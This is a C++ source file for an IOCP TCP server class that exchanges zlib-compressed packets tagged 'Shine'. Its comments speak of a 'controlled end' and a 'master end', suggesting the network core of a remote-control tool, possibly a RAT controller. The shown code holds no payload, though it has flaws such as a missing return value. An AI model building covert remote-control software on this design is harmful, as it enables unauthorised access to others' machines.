#include "stdafx.h"
#include "IOCPServer.h"
#include "zconf.h"
#include "zlib.h"

CIOCPServer::CIOCPServer()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
	{
		return;
	}
	memcpy(m_PacketFlagData, "Shine", PACKET_FLAG_LENGTH);
	m_ListenSocket	     = INVALID_SOCKET;
	m_ListenThreadHandle = NULL;
	m_KillEventHandle    = NULL;
	m_ListenEventHandle  = WSA_INVALID_EVENT;   //监听事件(事件模型)
	InitializeCriticalSection(&m_CriticalSection);
	m_CompletionPortHandle = NULL;

	m_ThreadPoolMin = 0;
	m_ThreadPoolMax = 0;
	m_ProcessorHighThreadsHold = 0;
	m_ProcessorLowThreadsHold = 0;
	m_WorkThreadCount = 0;
	m_CurrentThreadCount = 0;
	m_BusyThreadCount = 0;

	m_TimeToKill = FALSE;

}


CIOCPServer::~CIOCPServer()
{
	Sleep(10);
	SetEvent(m_KillEventHandle);


	WaitForSingleObject(m_ListenThreadHandle, INFINITE);


	if (m_ListenSocket != INVALID_SOCKET)
	{
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
	}

	if (m_ListenEventHandle != WSA_INVALID_EVENT)
	{
		WSACloseEvent(m_ListenEventHandle);
		m_ListenEventHandle = WSA_INVALID_EVENT;
	}

	if (m_CompletionPortHandle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_CompletionPortHandle);
		m_CompletionPortHandle = INVALID_HANDLE_VALUE;

	}

	if (m_KillEventHandle != NULL)
	{
		CloseHandle(m_KillEventHandle);
		m_KillEventHandle = NULL;
	}

	m_ThreadPoolMin = 0;
	m_ThreadPoolMax = 0;
	m_ProcessorHighThreadsHold = 0;
	m_ProcessorLowThreadsHold = 0;
	m_WorkThreadCount = 0;
	m_CurrentThreadCount = 0;
	m_BusyThreadCount = 0;
	DeleteCriticalSection(&m_CriticalSection);
	m_TimeToKill = TRUE;
	WSACleanup();
}


BOOL CIOCPServer::StartServer(pfnWindowNotifyProcedure WindowNotifyProcedure,USHORT Port)
{


	m_KillEventHandle = CreateEvent(NULL, FALSE, FALSE, NULL);

	if (m_KillEventHandle == NULL)
	{
		return FALSE;
	}

	//创建异步套接字(监听)
	
	//定义类成员变量 
	m_WindowNotifyProcedure = WindowNotifyProcedure;

	int Result = 0;
	m_ListenSocket = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);     //创建监听套接字

	if (m_ListenSocket == INVALID_SOCKET)
	{
		return FALSE;
	}

	m_ListenEventHandle = WSACreateEvent();   
	if (m_ListenEventHandle==WSA_INVALID_EVENT)
	{
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
		return FALSE;
	}

	//关联
	Result = WSAEventSelect(m_ListenSocket,	//将监听套接字与事件进行关联并授予FD_ACCEPT的属性
		m_ListenEventHandle,
		FD_ACCEPT|FD_CLOSE); 

	if (Result ==SOCKET_ERROR)
	{			
		WSACloseEvent(m_ListenEventHandle);
		m_ListenEventHandle = WSA_INVALID_EVENT;
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
		return FALSE;
	}
	SOCKADDR_IN	ServerAddress;
	ServerAddress.sin_port = htons(Port);
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_addr.s_addr = INADDR_ANY;  
	Result = bind(m_ListenSocket,
		(sockaddr*)&ServerAddress,
		sizeof(ServerAddress));

	if (Result == SOCKET_ERROR)
	{
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
		WSACloseEvent(m_ListenEventHandle);
		m_ListenEventHandle = WSA_INVALID_EVENT;
		return FALSE;
	}
	Result = listen(m_ListenSocket, SOMAXCONN);
	if (Result == SOCKET_ERROR)
	{
		closesocket(m_ListenSocket);
		m_ListenSocket = INVALID_SOCKET;
		
		WSACloseEvent(m_ListenEventHandle);
		m_ListenEventHandle = WSA_INVALID_EVENT;

		return FALSE;
	}
	//创建监听线程
	m_ListenThreadHandle =
		(HANDLE)CreateThread(NULL,
			0,
			(LPTHREAD_START_ROUTINE)ListenThreadProcedure,
			(void*)this,	      //向Thread回调函数传入this 方便我们的线程回调访问类中的成员    
			0,
			NULL);
	if (m_ListenThreadHandle == INVALID_HANDLE_VALUE)
	{
		closesocket(m_ListenSocket);

		m_ListenSocket = INVALID_SOCKET;
	
		WSACloseEvent(m_ListenEventHandle);
		m_ListenEventHandle = WSA_INVALID_EVENT;
		return FALSE;
	}
	
	//接收数据的IOCP
	InitializeIOCP();

}


DWORD CIOCPServer:: ListenThreadProcedure(LPVOID ParameterData)  
{
	CIOCPServer* This = (CIOCPServer*)ParameterData;
	int EventIndex = 0;
	WSANETWORKEVENTS NetWorkEvents;
	while (1)
	{
		EventIndex = WaitForSingleObject(This->m_KillEventHandle, 100);
		EventIndex = EventIndex - WAIT_OBJECT_0;
		if (EventIndex == 0)
		{
			break;
		}

		DWORD Result;
		Result = WSAWaitForMultipleEvents(1,
			&This->m_ListenEventHandle,
			FALSE,  //bwaifall
			100,
			FALSE);

		if (Result == WSA_WAIT_TIMEOUT)
		{
			continue;   //该事件没有授信
		}

		Result = WSAEnumNetworkEvents(This->m_ListenSocket,
			//如果事件授信 我们就将该事件转换成一个网络事件 进行 判断
			This->m_ListenEventHandle,
			&NetWorkEvents);

		if (Result == SOCKET_ERROR)   //出错了
		{
			break;
		}
		if (NetWorkEvents.lNetworkEvents & FD_ACCEPT)   //监听套接字授信   --->
		{
			if (NetWorkEvents.iErrorCode[FD_ACCEPT_BIT] == 0)
			{
				//如果是一个链接请求我们就进入OnAccept()函数进行处理
			    This->OnAccept();   //Accept  函数  上线OK 分配通信Client


	
			}
			else
			{
				break;
			}

		}

	}

	return 0;
}
BOOL CIOCPServer::InitializeIOCP(VOID)
{
	m_CompletionPortHandle = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);



	if (m_CompletionPortHandle == NULL)   //创建完成端口
	{

		return FALSE;
	}

	if (m_CompletionPortHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	SYSTEM_INFO si;
	GetSystemInfo(&si);  //获得PC中有几核

	m_ThreadPoolMin = 1;
    m_ThreadPoolMax = si.dwNumberOfProcessors * 2;
	
	m_ProcessorLowThreadsHold = 10;
	m_ProcessorHighThreadsHold = 75;

	ULONG WorkThreadCount = 2;

	HANDLE WorkThreadHandle = NULL;
	for (int i = 0; i < WorkThreadCount; i++)
	{
		WorkThreadHandle = (HANDLE)CreateThread(NULL,	             //创建工作线程目的是处理投递到完成端口中的任务			
			0,
			(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
			(void*)this,
			0,
			NULL);
		if (WorkThreadHandle == NULL)
		{
			CloseHandle(m_CompletionPortHandle);
			return FALSE;
		}
		m_WorkThreadCount++;
		CloseHandle(WorkThreadHandle);
	}
	return TRUE;
}
DWORD CIOCPServer::WorkThreadProcedure(LPVOID ParameterData)
{


	CIOCPServer* This = (CIOCPServer*)(ParameterData);

	HANDLE   CompletionPortHandle = This->m_CompletionPortHandle;
	DWORD    TransferBufferLength = 0;
	PCONTEXT_OBJECT  ContextObject = NULL;
	LPOVERLAPPED     ol = NULL;   //接受先前投递的Overlapped的地址
	OVERLAPPEDPLUS*  OverlappedPlus = NULL;
	ULONG            BusyThread = 0;
	
	
	BOOL             v1 = FALSE;
	InterlockedIncrement(&This->m_CurrentThreadCount);   //原子锁
	InterlockedIncrement(&This->m_BusyThreadCount);

	while (This->m_TimeToKill == FALSE)
	{

		InterlockedDecrement(&This->m_BusyThreadCount);     //0   16
		BOOL ReturnValue = GetQueuedCompletionStatus(
			CompletionPortHandle,
			&TransferBufferLength,
			(LPDWORD)&ContextObject,   //完成Key
			&ol, 60000);

		/*
		OverlappedPlus = new Object[Pack_Type Overlapped]
		&OverlappedPlus->Overlapped
		ReturnValue = PostQueuedCompletionStatus(m_CompletionPortHandle,
		0, (ULONG_PTR)ContextObject, &OverlappedPlus->m_ol);     //  工作线程  一个通知
		*/



		DWORD LastError = GetLastError();
		OverlappedPlus = CONTAINING_RECORD(ol, OVERLAPPEDPLUS, m_ol);  //重要
		BusyThread = InterlockedIncrement(&This->m_BusyThreadCount);   //1

		if (!ReturnValue && LastError != WAIT_TIMEOUT)   //当对方的套机制发生了关闭                    
		{
			if (ContextObject && This->m_TimeToKill == FALSE &&TransferBufferLength == 0)
			{
				
				This->RemoveStaleContext(ContextObject);
			}
			continue;
		}
		if (!v1)
		{
			//分配一个新的线程到线程到线程池
			if (BusyThread == This->m_CurrentThreadCount)
			{

				if (BusyThread < This->m_ThreadPoolMax)
				{
					{

						if (ContextObject != NULL)
						{

							HANDLE ThreadHandle = (HANDLE)CreateThread(NULL,
								0,
								(LPTHREAD_START_ROUTINE)WorkThreadProcedure,
								(void*)This,
								0,
								NULL);
							InterlockedIncrement(&This->m_WorkThreadCount);  //16   17

							CloseHandle(ThreadHandle);
						}

					}
				}
			}

			if (!ReturnValue && LastError == WAIT_TIMEOUT)
			{
				if (ContextObject == NULL)
				{
					{
						if (This->m_CurrentThreadCount > This->m_ThreadPoolMin)
						{
							break;
						}
					}
					v1 = TRUE;
				}
			}
		}
		if (!v1)  //成功 请求得到完成(两种 PostQueuedCompletionStatus 客户WSARecv )
		{
			//ReturnValue  GetQueuedCompletionStatus返回值  
			if (ReturnValue && OverlappedPlus != NULL && ContextObject != NULL)
			{
				try
				{
					//处理之前投递的没有完成请求
					This->PacketHandleIO(OverlappedPlus->m_PackType, ContextObject, TransferBufferLength);

					//没有释放内存
					ContextObject = NULL;

				}
				catch (...) {}
			}
		}

		if (OverlappedPlus)
		{
			delete OverlappedPlus;
			OverlappedPlus = NULL;
		}

	}
	InterlockedDecrement(&This->m_WorkThreadCount);
	InterlockedDecrement(&This->m_CurrentThreadCount);
	InterlockedDecrement(&This->m_BusyThreadCount);

	return 0;
}
BOOL CIOCPServer::PacketHandleIO(PACKET_TYPE PacketType, PCONTEXT_OBJECT ContextObject, DWORD TransferBufferLength)   //在工作线程中被调用
{
	BOOL v1 = FALSE;

	if (IOInitialize == PacketType)
	{
		v1 = OnClientInitializing(ContextObject, TransferBufferLength);  //OnAccept 函数中投递的请求
	}

	if (IORead == PacketType)   //WsaResv   被控端传送的数据
	{
		v1 = OnClientReceiving(ContextObject, TransferBufferLength);  //
	}

	if (IOWrite == PacketType)  //WsaSend  主控端向被控端传送的数据
	{
		v1 = OnClientPostSending(ContextObject, TransferBufferLength);
	}
	return v1;
}
BOOL CIOCPServer::OnClientInitializing(PCONTEXT_OBJECT  ContextObject, DWORD TransferBufferLength)
{
/*	int i = 0;
	for (i=0;i<3;i++)
	{
	int ReturnValue = send(ContextObject->ClientSocket,"HelloWorld",strlen("HelloWorld"),0);
	}
*/
//	MessageBox(NULL,"HelloInit","HelloInit",0);

	return TRUE;
}
BOOL CIOCPServer::OnClientReceiving(PCONTEXT_OBJECT  ContextObject, DWORD TransferBufferLength)
{

	CLock Object(m_CriticalSection);
	try
	{

		if (TransferBufferLength == 0)    //对方关闭了套接字
		{

			MessageBox(NULL, "关闭套接字", "关闭套接字", 0);
			RemoveStaleContext(ContextObject);
			return FALSE;
		}


		ContextObject->m_InCompressedBufferData.WriteArray((PBYTE)ContextObject->m_BufferData, TransferBufferLength);   //被压缩过的数据
																													    //将接收到的数据拷贝到我们自己的内存中wsabuff    8192


		while (ContextObject->m_InCompressedBufferData.GetArrayLength() >PACKET_HEADER_LENGTH)          //查看数据包里的数据
		{
			char v10[PACKET_FLAG_LENGTH] = { 0 }; //Shine


			CopyMemory(v10, ContextObject->m_InCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);



			if (memcmp(m_PacketFlagData, v10, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, ContextObject->m_InCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),  //[Shine[][]]
				sizeof(ULONG));

			//取出数据包的总长
			if (PackTotalLength && (ContextObject->m_InCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{
				ULONG DeCompressedLength = 0;  //[Shine][压缩的长度+13][没有压缩的长度][li]
				
				//[Shine][?1+13][?2][                      ]
				ContextObject->m_InCompressedBufferData.ReadArray((PBYTE)v10, PACKET_FLAG_LENGTH);

				//[?1+13][?2][                      ]   v10[] = "Shine"
				ContextObject->m_InCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				//[?2][                      ]   v10[] = "Shine"  PackTotalLength = ?1 + 13
				ContextObject->m_InCompressedBufferData.ReadArray((PBYTE)&DeCompressedLength, sizeof(ULONG));

				//[HelloWorld                ]   v10[] = "Shine"  PackTotalLength = ?1   DeCompressedLength = ?2
			
				
				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];       //没有解压数据长度

				PBYTE DeCompressedData = new BYTE[DeCompressedLength];  //解压过的数据长度 

				if (CompressedData == NULL || DeCompressedData == NULL)
				{
					throw "Bad Allocate";

				}
				ContextObject->m_InCompressedBufferData.ReadArray(CompressedData, CompressedLength); //从数据包当前将源数据没有解压读取到pData   448


																						
				int	ReturnValue = uncompress(DeCompressedData, &DeCompressedLength, CompressedData, CompressedLength);     //解压数据

				if (ReturnValue == Z_OK)
				{
					ContextObject->m_InDeCompressedBufferData.ClearArray();
					ContextObject->m_InCompressedBufferData.ClearArray();
					ContextObject->m_InDeCompressedBufferData.WriteArray(DeCompressedData, DeCompressedLength);


					delete[] CompressedData;
					delete[] DeCompressedData;
					m_WindowNotifyProcedure(ContextObject);  //通知窗口   
				}
				else
				{
					delete[] CompressedData;
					delete[] DeCompressedData;
					throw "Bad Buffer";
				}



			}
			else
			{
				break;
			}
		}

		PostRecv(ContextObject);   //投递新的接收数据的请求
	}
	catch (...)
	{
		ContextObject->m_InCompressedBufferData.ClearArray();
		ContextObject->m_InDeCompressedBufferData.ClearArray();

		PostRecv(ContextObject);
	}

	return TRUE;

}
void CIOCPServer::OnAccept()
{
	int			Result = 0;	
	
	SOCKET		ClientSocket = INVALID_SOCKET;
	SOCKADDR_IN	ClientAddress = { 0 };                  //存放上线用户的IP 端口
	int			ClientAddressLength = sizeof(SOCKADDR_IN);;

	ClientSocket = accept(m_ListenSocket,               //同步接受上线信息
		(sockaddr*)&ClientAddress,
		&ClientAddressLength);                         //通过我们的监听套接字来生成一个与之信号通信的套接字
	

	if (ClientSocket == SOCKET_ERROR)
	{
		Result = WSAGetLastError();
		if (Result != WSAEWOULDBLOCK)             //不懂
		{
			return;
		}

		return;
	}

 
	//我们在这里为每一个到达的信号维护了一个与之关联的数据结构这里简称为用户的上下背景文
	PCONTEXT_OBJECT ContextObject = AllocateContext();

	if (ContextObject == NULL)
	{

		closesocket(ClientSocket);
		ClientSocket = INVALID_SOCKET;
		return;
	}


	//成员赋值
	ContextObject->ClientSocket = ClientSocket;


	//关联内存(wsaRecv 用于接受客户端来的数据)
	ContextObject->wsaInBuffer.buf = (char*)ContextObject->m_BufferData;
	ContextObject->wsaInBuffer.len = sizeof(ContextObject->m_BufferData);


	HANDLE Handle = CreateIoCompletionPort((HANDLE)ClientSocket, m_CompletionPortHandle, (ULONG_PTR)ContextObject, 0);   //4(指针 通知)


	if (Handle != m_CompletionPortHandle)
	{

		delete ContextObject;
		ContextObject = NULL;

		if (ClientSocket != INVALID_SOCKET)
		{
			closesocket(ClientSocket);
			ClientSocket = INVALID_SOCKET;
		}

		return;
	}



	//设置套接字的选项卡 Set KeepAlive 开启保活机制 SO_KEEPALIVE 
	//保持连接检测对方主机是否崩溃如果2小时内在此套接口的任一方向都没
	//有数据交换，TCP就自动给对方 发一个保持存活
/*	m_KeepLiveTime = 3;
	BOOL bOk = TRUE;
	if (setsockopt(ContextObject->ClientSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&bOk, sizeof(bOk)) != 0)
	{
	}
	//设置超时详细信息
	tcp_keepalive	KeepAlive;
	KeepAlive.onoff = 1; // 启用保活
	KeepAlive.keepalivetime = m_KeepLiveTime;       //超过3分钟没有数据，就发送探测包
	KeepAlive.keepaliveinterval = 1000 * 10;         //重试间隔为10秒 Resend if No-Reply
	WSAIoctl
	(
		ContextObject->ClientSocket,
		SIO_KEEPALIVE_VALS,
		&KeepAlive,
		sizeof(KeepAlive),
		NULL,
		0,
		(unsigned long *)&bOk,
		0,
		NULL
	);
	*/
	//在做服务器时，如果发生客户端网线或断电等非正常断开的现象，如果服务器没有设置SO_KEEPALIVE选项，
	//则会一直不关闭SOCKET。因为上的的设置是默认两个小时时间太长了所以我们就修正这个值
	CLock Object(m_CriticalSection);
	m_ContextConnectionList.AddTail(ContextObject);     //插入到我们的内存列表中
	
											
	OVERLAPPEDPLUS	*OverlappedPlus = new OVERLAPPEDPLUS(IOInitialize);   //注意这里的重叠IO请求是 用户请求上线

	//[IOInitialize][Overlapped(Event)]

	//自己向完成端口投递请求
	BOOL ReturnValue = FALSE;
	ReturnValue = PostQueuedCompletionStatus(m_CompletionPortHandle,
		0, (ULONG_PTR)ContextObject, &OverlappedPlus->m_ol);     //  工作线程  一个通知

	//因为我们接受到了一个用户上线的请求那么我们就将该请求发送给我们的完成端口 让我们的工作线程处理它

	//ERROR_IO_PENDING  正确的错误
	if ((!ReturnValue && GetLastError() != ERROR_IO_PENDING))  //如果投递失败
	{
		RemoveStaleContext(ContextObject);
		return;
	}
    //投递WsaRecv请求
	PostRecv(ContextObject);    //WSARecv
}
VOID CIOCPServer::PostRecv(CONTEXT_OBJECT* ContextObject)
{
	OVERLAPPEDPLUS * OverlappedPlus = new OVERLAPPEDPLUS(IORead);    //向我们的刚上线的用户的投递一个接受数据的请求  如果用户的第一个数据包到达也就就是被控端的登陆请求到达我们的工作线程就
																	 //会响应	并调用ProcessIOMessage函数
	DWORD			ReturnLength;
	ULONG			Flags = MSG_PARTIAL;
	int ReturnValue = WSARecv(ContextObject->ClientSocket,
		&ContextObject->wsaInBuffer,   //接受数据的内存
		1,
		&ReturnLength,    // TransferBufferLength
		&Flags,
		&OverlappedPlus->m_ol,
		NULL);

	if (ReturnValue == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
	{
		RemoveStaleContext(ContextObject);
	}
}
VOID CIOCPServer::OnClientPreSending(CONTEXT_OBJECT* ContextObject, PBYTE BufferData, ULONG BufferLength)
{
	if (ContextObject == NULL)
	{
		return;
	}

	try
	{
		if (BufferLength > 0)
		{
			unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;
			LPBYTE			CompressedData = new BYTE[CompressedLength];
			int	ReturnValue = compress(CompressedData, &CompressedLength, (LPBYTE)BufferData, BufferLength);

			if (ReturnValue != Z_OK)
			{
				delete[] CompressedData;
				return;
			}
			ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;

			ContextObject->m_OutCompressedBufferData.WriteArray((LPBYTE)m_PacketFlagData, PACKET_FLAG_LENGTH);

			ContextObject->m_OutCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));

			ContextObject->m_OutCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));

			ContextObject->m_OutCompressedBufferData.WriteArray(CompressedData, CompressedLength);

			delete[] CompressedData;
		}
		OVERLAPPEDPLUS* OverlappedPlus = new OVERLAPPEDPLUS(IOWrite);
		PostQueuedCompletionStatus(m_CompletionPortHandle, 0, (DWORD)ContextObject, &OverlappedPlus->m_ol);
	}
	catch (...) {}
}
BOOL CIOCPServer::OnClientPostSending(CONTEXT_OBJECT* ContextObject, ULONG TransferBufferLength)
{
	try
	{
		DWORD Flags = MSG_PARTIAL;
		ContextObject->m_OutCompressedBufferData.RemoveComletedArray(TransferBufferLength);             //将完成的数据从数据结构中去除
		if (ContextObject->m_OutCompressedBufferData.GetArrayLength() == 0)
		{
			ContextObject->m_OutCompressedBufferData.ClearArray();
			return true;		                             //走到这里说明我们的数据真正完全发送
		}
		else
		{
			OVERLAPPEDPLUS * OverlappedPlus = new OVERLAPPEDPLUS(IOWrite);           //数据没有完成  我们继续投递 发送请求
			ContextObject->wsaOutBuffer.buf = (char*)ContextObject->m_OutCompressedBufferData.GetArray();
			ContextObject->wsaOutBuffer.len = ContextObject->m_OutCompressedBufferData.GetArrayLength();                 //获得剩余的数据和长度    
			int ReturnValue = WSASend(ContextObject->ClientSocket,
				&ContextObject->wsaOutBuffer,
				1,
				&ContextObject->wsaOutBuffer.len,
				Flags,
				&OverlappedPlus->m_ol,
				NULL);
			if (ReturnValue == SOCKET_ERROR && WSAGetLastError() != WSA_IO_PENDING)
			{
				RemoveStaleContext(ContextObject);
			}
		}
	}
	catch (...) {}
	return FALSE;
}
PCONTEXT_OBJECT CIOCPServer::AllocateContext()
{
	
	//内存池
	PCONTEXT_OBJECT ContextObject = NULL;
	CLock Object(m_CriticalSection);   //进入临界区
	if (m_ContextFreePoolList.IsEmpty() == FALSE)
	{
		ContextObject = m_ContextFreePoolList.RemoveHead();   //内存池取内存
	}
	else
	{
		ContextObject = new CONTEXT_OBJECT;
	}
	if (ContextObject != NULL)
	{
		ContextObject->InitMember();   // 初始化成员变量
	}
	return ContextObject;

}
VOID CIOCPServer::RemoveStaleContext(CONTEXT_OBJECT* ContextObject)
{
	CLock Object(m_CriticalSection);
	if (m_ContextConnectionList.Find(ContextObject))    //在内存中查找该用户的上下背景文数据结构
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);  //取消在当前套接字的异步IO   以前的未完成的异步请求全部立即取消   
		closesocket(ContextObject->ClientSocket);      //关闭套接字
		ContextObject->ClientSocket = INVALID_SOCKET;
		while (!HasOverlappedIoCompleted((LPOVERLAPPED)ContextObject))   //判断还有没有异步IO请求在当前套接字上
		{
			Sleep(0);
		}
		MoveContextToFreePoolList(ContextObject);  //将该内存结构回收至内存池
	}
}
VOID CIOCPServer::MoveContextToFreePoolList(CONTEXT_OBJECT* ContextObject)
{

	CLock Object(m_CriticalSection);

	POSITION Pos = m_ContextConnectionList.Find(ContextObject);
	if (Pos)
	{

		ContextObject->m_InCompressedBufferData.ClearArray();
		ContextObject->m_InDeCompressedBufferData.ClearArray();
		ContextObject->m_OutCompressedBufferData.ClearArray();

		memset(ContextObject->m_BufferData, 0, PACKET_HEADER_LENGTH);
		m_ContextFreePoolList.AddTail(ContextObject);                         //回收至内存池
		m_ContextConnectionList.RemoveAt(Pos);                                //从内存结构中移除

	}
}